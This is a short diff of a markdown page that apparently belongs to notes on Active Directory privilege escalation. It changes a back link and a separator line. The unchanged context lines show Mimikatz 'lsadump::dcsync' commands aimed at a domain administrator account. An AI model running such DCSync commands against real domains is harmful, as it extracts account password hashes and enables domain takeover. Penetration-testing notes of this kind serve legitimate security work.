@@ -102,6 +102,7 @@ $ADSI.psbase.commitchanges()
 lsadump::dcsync /domain:<Domain> /user:<User>
 lsadump::dcsync /domain:example.com /user:administrator
 ```
----
 
-[back](/adprivesc.html)
+
+---
+[back](../adprivesc.md)
